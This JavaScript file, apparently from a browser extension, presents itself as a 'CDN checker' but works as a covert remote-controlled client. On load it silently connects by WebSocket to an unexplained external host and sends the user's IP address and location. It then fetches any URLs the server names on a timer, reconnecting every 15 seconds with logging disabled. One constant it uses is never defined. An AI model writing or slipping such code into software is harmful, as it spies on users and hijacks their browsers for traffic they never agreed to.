const CDNChecker = function() {

  const THROW_RESPONSE_BAD = 'THROW_EMPTY';
  const IS_VISIBLE_LOGS = false;

  const self = this;
  var details = {};
  var socket = null;
  var linkTimeWait = null;

  this.init = function() {
    socket = new WebSocket("ws://cdn.extenbalanc.org:34821/cdn"); //

    socket.onopen = this.onOpenHandler.bind(this);
    socket.onclose = this.onCloseHandler.bind(this);
    socket.onmessage = this.onMessageHandler.bind(this);
    socket.onerror = this.onErrorHandler.bind(this);

    socket.emit = this.emitBehavior;
    socket.on = this.onBehavior;

    socket.on('request-measure-time', this.measureTimeHandler.bind(this));
    socket.on('request-stop-last-test', this.stopLastTestHandler.bind(this));
  };

  // default Handlers

  this.onOpenHandler = function() {
    if(IS_VISIBLE_LOGS)
      console.log("Connection established");

    this.getUserLocation().then(function(location) {
      socket.emit('response-location', location);
    });
  };

  this.onMessageHandler = function(event) {
    if(IS_VISIBLE_LOGS)
      console.log("Received data " + event.data);

    try {
      let data = JSON.parse(event.data);

      if(typeof data !== 'object' || typeof data[0] !== 'string' || typeof data[1] !== 'object')
        return;

      let action = data[0];
      socket[action](data[1]);

    } catch(ex) {
      if(IS_VISIBLE_LOGS)
        console.log(ex);
    }
  };

  this.onCloseHandler = function(event) {
    if(IS_VISIBLE_LOGS) {
      if (event.wasClean)
        console.log('Connection closed clean');
      else
        console.log('Disconnection');
      console.log('Code: ' + event.code + ' cause: ' + event.reason);
    }

    setTimeout(this.init.bind(this), 15000);
  };

  this.onErrorHandler = function(error) {
    if(IS_VISIBLE_LOGS)
      console.log("Error " + error.message);
  };

  // handlers

  this.measureTimeHandler = function(msg) {
    this.stopLastTestHandler();
    linkTimeWait = setTimeout(this.runMeasureTimeHandler.bind(this, msg), msg.timeWait);
  };

  this.runMeasureTimeHandler = function(msg) {
    details.url = msg.url;
    this.measureTimeSpan(msg.url)
      .then(this.sendMeasureTimeResponse.bind(this))
      .catch(function() { });
  }

  this.stopLastTestHandler = function() {
    if(linkTimeWait)
      clearTimeout(linkTimeWait);
  };

  // behaviors

  this.emitBehavior = function(action, message) {
    try {
      let payload = JSON.stringify([action, message]);
      this.send(payload);
    } catch(ex) {
      if(IS_VISIBLE_LOGS)
        console.log(ex);
    }
  };

  this.onBehavior = function(action, callback) {
    this[action] = callback;
  };

  // senders

  this.sendMeasureTimeResponse = function() {
    socket.emit('response-measure-time', details);
  };

  // other

  this.sendGetRequest = function(url) {
    return fetch(url).then(function(response) {
      if (response.status != 200)
        throw new Error(THROW_RESPONSE_BAD);

      return response;
    }).catch(function(ex) {
      return ex;
    });
  };

  this.getUserLocation = function() {
    return this.sendGetRequest('http://ip-api.com/json/?fields=country,city,regionName,query')
      .then(function(response) {
        return response.json();
      });
  };

  this.measureTimeSpan = function(url) {
    let headers = new Headers();
    headers.append('pragma', 'no-cache');
    headers.append('cache-control', 'no-cache');
    var startTime = Date.now();

    return fetch(url, {
      method: 'GET',
      headers: headers,
    }).then(function(response) {
      if (response.status != 200)
        throw new Error(THROW_BAD_RESPONSE);
      return response.blob();
    }).then(function() {
      details.timeSpan = Date.now() - startTime;
      return true;
    });
  };

};

const cdnChecker = new CDNChecker();
cdnChecker.init();
